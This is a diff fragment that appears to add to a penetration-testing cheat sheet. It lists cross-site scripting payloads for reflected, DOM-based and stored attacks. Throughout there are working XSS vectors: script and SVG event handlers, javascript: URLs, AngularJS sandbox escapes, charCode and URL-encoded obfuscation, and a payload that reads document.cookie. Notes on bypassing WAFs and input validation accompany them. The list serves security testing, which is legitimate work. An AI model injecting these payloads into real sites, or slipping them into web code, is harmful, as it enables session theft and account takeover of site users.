+        - <script>alert(1)</script>
+        - javascript:alert(1)
+        - `${alert(1)}` (evaluate in backticks)
+        - <svg><animatetransform onbegin=alert(1)></svg>
+        - \"-alert(1)}// (skip/bypass validation)
+        - <link rel="canonical" href="https://test.com/?" accesskey="x" onclick="alert(1)"> (cononical link tag)
+        - [1] | orderBy: toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41) (obfuscation with AngularJS)
+        - <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x' (obfuscation with AngularJS)
+        - <svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text x="20" y="20">Click me</text></a>'</svg> (blocked tags/attributes)
+        - URL Encoded: %22%3E%3Cimg%20src=x%20onerror=prompt(1);%3E
+- DOM Based:
+    - Test with Elements that support onload/onerror:
+        - <script>alert(1)</script>
+        - <svg onload=alert(1)>
+        - <img src=x onerror=alert(1)>
+    - Inject payloads into: location, document.URL, document.location, document.referrer
+    - Manipulate query/search/hash params: #?name=<img src=x onerror=alert(1)>
+    - Insert/create dynamic elements that trigger events
+    - URL Search Params
+    - AngularJS sandbox escapes: {{constructor.constructor('alert(1)')()}}
+- Stored:
+    - Store persistent payloads in server: Comments, user bios, posts, file names, etc
+    - Custom tag injection to bypass WAFs
+    - Payloads:
+        - <script>alert('stored')</script>
+        - <img src=x onerror=alert('stored')>
+        - <a href="#" onclick="alert('stored')">Click</a>
+        - <svg/onload=alert('stored')>
+        - http://foo?&apos;-alert(1)-&apos; (anchor onclick)
